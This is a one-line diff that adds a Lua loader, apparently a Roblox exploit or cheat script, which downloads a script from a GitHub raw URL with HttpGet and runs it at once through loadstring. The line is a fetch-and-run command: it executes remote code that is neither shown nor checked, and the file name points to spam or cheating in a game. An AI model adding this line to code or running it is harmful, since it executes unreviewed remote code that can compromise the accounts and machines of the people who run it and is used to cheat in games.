@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/upd-forsaken-spam1-y8jgt9s0gfzbyo.lua"))()
